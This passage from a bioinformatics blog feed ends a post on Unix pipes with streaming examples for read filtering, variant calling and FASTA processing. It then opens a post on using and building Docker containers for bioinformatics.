<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Process RNA-seq reads:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 1. Filter low quality</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 2. Count valid reads</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 3. Extract length distribution</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 4. Detect adapters</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">fastq_quality_filter </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-i</span><span class="token plain"> reads.fastq </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-q</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">20</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">80</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token function" style="color:hsl(221, 87%, 60%)">tee</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token function" style="color:hsl(221, 87%, 60%)">wc</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-l</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">awk</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'{print "Valid reads: "$1/4}'</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> read_count.txt</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token function" style="color:hsl(221, 87%, 60%)">tee</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token function" style="color:hsl(221, 87%, 60%)">awk</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'NR%4==2 {print length}'</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token function" style="color:hsl(221, 87%, 60%)">sort</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-n</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">uniq</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> length_dist.txt</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  fastx_collapser </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-o</span><span class="token plain"> collapsed.fastq </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  fastx_clipper </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-a</span><span class="token plain"> AGATCGGAAGAGC </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-o</span><span class="token plain"> trimmed.fastq</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="example-2-variant-calling-pipeline">Example 2: Variant Calling Pipeline<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#example-2-variant-calling-pipeline" class="hash-link" aria-label="Direct link to Example 2: Variant Calling Pipeline" title="Direct link to Example 2: Variant Calling Pipeline" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Align reads, mark duplicates, and call variants in one pass</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bwa mem </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-t</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">8</span><span class="token plain"> reference.fa reads.fastq </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  samtools view </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-b</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-S</span><span class="token plain"> - </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  samtools </span><span class="token function" style="color:hsl(221, 87%, 60%)">sort</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-o</span><span class="token plain"> sorted.bam - </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  samtools markdup sorted.bam marked.bam </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  samtools index marked.bam </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  bcftools mpileup </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"> reference.fa marked.bam </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  bcftools call </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-mv</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-o</span><span class="token plain"> variants.vcf</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Memory: Constant (~1-2 GB for buffers)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Disk: Only intermediate files marked.bam (necessary for bcftools indexing)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="example-3-fasta-processing-with-decompression">Example 3: FASTA Processing with Decompression<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#example-3-fasta-processing-with-decompression" class="hash-link" aria-label="Direct link to Example 3: FASTA Processing with Decompression" title="Direct link to Example 3: FASTA Processing with Decompression" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Decompress, process, and recompress in a single pipeline</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">zcat genome.fasta.gz </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token function" style="color:hsl(221, 87%, 60%)">awk</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'/^&gt;/{if(NR&gt;1)print prev_seq; seq=""; prev_seq=$0; next} {seq=seq $0} END{print prev_seq; print seq}'</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token function" style="color:hsl(221, 87%, 60%)">gzip</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> processed.fasta.gz</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># No intermediate uncompressed files</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Entire genome processed with minimal disk space</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="summary-why-pipes-matter-in-bioinformatics">Summary: Why Pipes Matter in Bioinformatics<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#summary-why-pipes-matter-in-bioinformatics" class="hash-link" aria-label="Direct link to Summary: Why Pipes Matter in Bioinformatics" title="Direct link to Summary: Why Pipes Matter in Bioinformatics" translate="no">​</a></h2>
<table><thead><tr><th>Problem</th><th>Pipe Solution</th></tr></thead><tbody><tr><td><strong>Intermediate files</strong></td><td>Stream directly between tools</td></tr><tr><td><strong>Disk space</strong></td><td>No temporary storage needed</td></tr><tr><td><strong>Memory usage</strong></td><td>Constant, independent of data size</td></tr><tr><td><strong>Processing speed</strong></td><td>Single sequential read of data</td></tr><tr><td><strong>Failure recovery</strong></td><td>Failures caught immediately</td></tr><tr><td><strong>Code readability</strong></td><td>Clear, linear data flow</td></tr></tbody></table>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="key-takeaways">Key Takeaways<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#key-takeaways" class="hash-link" aria-label="Direct link to Key Takeaways" title="Direct link to Key Takeaways" translate="no">​</a></h3>
<p><strong>1. Pipes Enable Streaming Data Processing</strong></p>
<ul>
<li class="">Data flows through memory buffers, not disk</li>
<li class="">Only ~64KB per pipe sits in RAM at any time</li>
<li class="">Processing 1GB or 1TB uses the same constant memory</li>
<li class="">This is the fundamental advantage over traditional file-based workflows</li>
</ul>
<p><strong>2. Kernel-Level Synchronization (Automatic)</strong></p>
<ul>
<li class="">No manual management needed</li>
<li class="">Backpressure prevents one slow command from overwhelming others</li>
<li class="">If a command fails, the entire pipeline fails cleanly</li>
<li class="">Use <code>set -o pipefail</code> in bash to ensure this behavior</li>
</ul>
<p><strong>3. I/O Reduction is Massive in Bioinformatics</strong></p>
<ul>
<li class="">Traditional alignment: 100GB reads → 500GB SAM → 100GB BAM (1.1TB I/O)</li>
<li class="">Pipe alignment: 100GB reads → 100GB BAM (200GB I/O total)</li>
<li class="">Savings: 5.5x reduction in disk I/O</li>
<li class="">Practical benefit: 2-5x faster execution on disk-bound operations</li>
</ul>
<p><strong>4. Pipes Work Seamlessly with Cloud Storage</strong></p>
<ul>
<li class="">Download with <code>wget -O -</code> or <code>aws s3 cp - s3://...</code></li>
<li class="">Stream directly from S3 without local copies</li>
<li class="">Upload results on-the-fly during processing</li>
<li class="">Combine with <code>tee</code> for simultaneous processing and uploading</li>
</ul>
<p><strong>5. Production Workflows (Nextflow, Sarek) Use Pipes Extensively</strong></p>
<ul>
<li class="">Real example: Sarek's <code>BWA_MEM</code> process pipes <code>bwa mem | samtools sort</code></li>
<li class="">This is the standard pattern for large-scale bioinformatics</li>
<li class="">Nextflow adds reliability and error handling on top</li>
<li class="">No need to choose between pipes and Nextflow—they work together</li>
</ul>
<p><strong>6. Practical Patterns You'll Use</strong></p>
<table><thead><tr><th>Pattern</th><th>Use Case</th><th>Command</th></tr></thead><tbody><tr><td><strong>Simple chain</strong></td><td>Sequential processing</td><td><code>cmd1 | cmd2 | cmd3</code></td></tr><tr><td><strong>Branching</strong></td><td>Multiple outputs from one input</td><td><code>cmd1 | tee &gt;(cmd2) | cmd3</code></td></tr><tr><td><strong>Download + process</strong></td><td>Remote files without storage</td><td><code>wget -O - url | gunzip | process</code></td></tr><tr><td><strong>Upload + compress</strong></td><td>Direct to cloud storage</td><td><code>process | gzip | aws s3 cp -</code></td></tr><tr><td><strong>Error safety</strong></td><td>Catch failures in pipes</td><td><code>set -o pipefail</code></td></tr><tr><td><strong>Parallel processing</strong></td><td>Scale across cores/machines</td><td><code>input | parallel 'process'</code></td></tr></tbody></table>
<p><strong>7. When Pipes Are Most Valuable</strong></p>
<p>✅ <strong>Use pipes for:</strong></p>
<ul>
<li class="">Massive datasets (100GB+) where I/O is the bottleneck</li>
<li class="">Cloud storage workflows where local disk is expensive</li>
<li class="">Real-time monitoring of long-running analyses</li>
<li class="">Linear processing chains (one output → next input)</li>
<li class="">Development and rapid prototyping</li>
<li class="">Nextflow process scripts (internal tool chaining)</li>
</ul>
<p>❌ <strong>Avoid pipes for:</strong></p>
<ul>
<li class="">Highly branching workflows (many different paths)</li>
<li class="">Complex error recovery (need to restart from middle)</li>
<li class="">Data that needs multiple passes through the same file</li>
<li class="">When you need to monitor intermediate results extensively</li>
</ul>
<p><strong>8. Master These Tools for Production Workflows</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Essential for pipe mastery:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">set</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-o</span><span class="token plain"> pipefail              </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Error handling</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">tee</span><span class="token plain">                          </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Branching</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">pv</span><span class="token plain">                           </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Progress monitoring</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">process substitution: </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">cmd</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Streaming to files</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">AWS S3 pipes: aws s3 </span><span class="token function" style="color:hsl(221, 87%, 60%)">cp</span><span class="token plain"> - s3://</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">..</span><span class="token plain">. </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Cloud integration</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">GNU parallel                 </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Scale across cores</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="final-thoughts">Final Thoughts<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#final-thoughts" class="hash-link" aria-label="Direct link to Final Thoughts" title="Direct link to Final Thoughts" translate="no">​</a></h2>
<p>Unix pipes are a cornerstone of efficient bioinformatics. They're not just a convenient syntax—they're a fundamental architecture for processing data that would otherwise overwhelm available disk space and I/O capacity.</p>
<p>The real power becomes apparent at scale:</p>
<ul>
<li class=""><strong>Small datasets:</strong> Pipes save time and code complexity</li>
<li class=""><strong>Large datasets:</strong> Pipes are often the only practical solution</li>
<li class=""><strong>Cloud workflows:</strong> Pipes enable streaming to/from S3 without local copies</li>
<li class=""><strong>Production pipelines:</strong> Pipes are embedded in every major workflow (Nextflow, Snakemake, etc.)</li>
</ul>
<p>By understanding how pipes work under the hood—how the kernel manages file descriptors, buffers data, and synchronizes backpressure—you can write bioinformatics workflows that are not just faster, but fundamentally more efficient.</p>
<p><strong>Start small:</strong> Use pipes in your next single-command analysis. Progress to chaining tools. Eventually, you'll write entire bioinformatics workflows as elegant streaming pipelines—just like Sarek does.</p>
<p>Your future self (and your disk quota administrator) will thank you.</p>]]></content>
        <author>
            <name>Thanh-Giang Tan Nguyen</name>
            <email>nttg8100@gmail.com</email>
            <uri>https://www.facebook.com/nttg8100</uri>
        </author>
        <category label="unix" term="unix"/>
        <category label="pipes" term="pipes"/>
        <category label="bioinformatics" term="bioinformatics"/>
        <category label="streaming" term="streaming"/>
        <category label="data-processing" term="data-processing"/>
        <category label="performance" term="performance"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Containers in Bioinformatics: Community Tooling and Efficient Docker Building]]></title>
        <id>https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker</id>
        <link href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker"/>
        <updated>2026-02-09T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Docker containers are revolutionizing bioinformatics by automating reproducibility and portability across platforms. But what problems can they actually solve? This post shows real-world applications of containers in bioinformatics workflows, then guides you through the simplest possible ways to use, build and debug them.]]></summary>
        <content type="html"><![CDATA[<p>Docker containers are revolutionizing bioinformatics by automating reproducibility and portability across platforms. But what problems can they actually solve? This post shows real-world applications of containers in bioinformatics workflows, then guides you through the simplest possible ways to use, build and debug them.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="prerequisites-get-docker-installed-and-running">Prerequisites: Get Docker Installed and Running<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#prerequisites-get-docker-installed-and-running" class="hash-link" aria-label="Direct link to Prerequisites: Get Docker Installed and Running" title="Direct link to Prerequisites: Get Docker Installed and Running" translate="no">​</a></h2>
<p>Before reading this blog, <strong>you need Docker installed on your system</strong>. This blog assumes you already have Docker up and running and covers how to effectively use containers for bioinformatics work.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="start-here-first">Start Here First<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#start-here-first" class="hash-link" aria-label="Direct link to Start Here First" title="Direct link to Start Here First" translate="no">​</a></h3>
<p>If Docker is not yet installed on your machine, visit the official Docker documentation:</p>
<p><strong>📦 <a href="https://docs.docker.com/get-started/get-docker/" target="_blank" rel="noopener noreferrer" class="">https://docs.docker.com/get-started/get-docker/</a></strong></p>
<p>This guide will walk you through:</p>
<ul>
<li class=""><strong>Installing Docker Desktop</strong> (Mac, Windows, Linux)</li>
<li class=""><strong>Verifying your installation</strong> with <code>docker --version</code></li>
<li class=""><strong>Running your first container</strong> with <code>docker run hello-world</code></li>
<li class=""><strong>Understanding Docker basics</strong> (images, containers, registries)</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="what-you-need-to-know">What You Need to Know<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#what-you-need-to-know" class="hash-link" aria-label="Direct link to What You Need to Know" title="Direct link to What You Need to Know" translate="no">​</a></h3>
<p>After installing Docker, verify it's working:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check Docker version</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--version</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Output: Docker version 24.0.0, build 12345abc</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run a test container</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run hello-world</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Output: Hello from Docker! This message shows that your installation appears to be working correctly.</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="about-this-blog">About This Blog<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#about-this-blog" class="hash-link" aria-label="Direct link to About This Blog" title="Direct link to About This Blog" translate="no">​</a></h3>
<p>Once Docker is installed and working, this blog will teach you:</p>
<ol>
<li class=""><strong>Why manual installation fails</strong> and how containers solve reproducibility problems</li>
<li class=""><strong>How to use Docker containers</strong> for bioinformatics data analysis</li>
<li class=""><strong>How to build efficient Docker images</strong> with best practices</li>
<li class=""><strong>How to build containers with Micromamba and Pixi</strong> for bioinformatics workflows</li>
<li class=""><strong>How to find pre-built containers</strong> before building from scratch</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="prerequisites-checklist">Prerequisites Checklist<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#prerequisites-checklist" class="hash-link" aria-label="Direct link to Prerequisites Checklist" title="Direct link to Prerequisites Checklist" translate="no">​</a></h3>
<p>Before continuing, verify you have:</p>
<ul>
<li class="">✅ Docker installed (<code>docker --version</code> works)</li>
<li class="">✅ Docker daemon running (or Docker Desktop active)</li>
<li class="">✅ Can pull images (<code>docker pull hello-world</code> works)</li>
<li class="">✅ Basic familiarity with command line/terminal</li>
<li class="">✅ (Optional but helpful) Nextflow installed for pipeline examples</li>
</ul>
<p><strong>Not ready?</strong> Go to <a href="https://docs.docker.com/get-started/get-docker/" target="_blank" rel="noopener noreferrer" class="">https://docs.docker.com/get-started/get-docker/</a> first, then come back here!</p>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="1-why-manual-installation-fails-the-old-way-vs-modern-containers">1. Why Manual Installation Fails: The Old Way vs. Modern Containers<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#1-why-manual-installation-fails-the-old-way-vs-modern-containers" class="hash-link" aria-label="Direct link to 1. Why Manual Installation Fails: The Old Way vs. Modern Containers" title="Direct link to 1. Why Manual Installation Fails: The Old Way vs. Modern Containers" translate="no">​</a></h2>
<p>Traditionally, bioinformatics labs installed software on shared servers or laptops using commands like:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">apt-get</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">install</span><span class="token plain"> samtools bwa python3</span><br></span></code></pre></div></div>
<p>While this seems easy, it creates major reproducibility, portability, and maintenance headaches:</p>
<ul>
<li class=""><strong>Manual Steps:</strong> Each researcher (or lab) performs installs slightly differently. Written instructions, scripts, and troubleshooting steps are often lost, mixed, or outdated.</li>
<li class=""><strong>Not Reproducible:</strong> No record of what was installed, which versions, or the exact order. Over time, software updates, conflicts, and broken dependencies accumulate, leading to the "works for me" problem.</li>
<li class=""><strong>Hard to Debug:</strong> Version mismatches, library conflicts, and subtle errors are almost impossible to diagnose or fix once the environment drifts.</li>
<li class=""><strong>Not Portable:</strong> Scripts break on macOS, Windows, or other Linux variants. HPC systems often restrict sudo/root access, making traditional installs impossible.</li>
</ul>
<p><strong>Result:</strong> Collaboration across labs, institutions, or countries becomes fragile. Reproducing results—even on your own machine—can be a challenge!</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-modern-solution-containers-and-community-tooling">The Modern Solution: Containers and Community Tooling<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#the-modern-solution-containers-and-community-tooling" class="hash-link" aria-label="Direct link to The Modern Solution: Containers and Community Tooling" title="Direct link to The Modern Solution: Containers and Community Tooling" translate="no">​</a></h3>
<p>Today, bioinformatics has largely replaced manual installs with containers and environment managers:</p>
<ul>
<li class=""><strong>BioConda:</strong> Over 8000 bioinformatics packages can be installed reproducibly via Conda.</li>
<li class=""><strong>BioContainers:</strong> Automatically generates Docker containers for each tool, available at <a href="https://quay.io/organization/biocontainers" target="_blank" rel="noopener noreferrer" class="">quay.io/biocontainers</a>.<!-- -->
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> pull quay.io/biocontainers/samtools:1.15.1--h1170115_0</span><br></span></code></pre></div></div>
</li>
<li class=""><strong>Seqera/Nextflow/nf-core:</strong> Pipelines with environment definitions (Conda, Docker, Singularity) are shared and run identically everywhere.</li>
</ul>
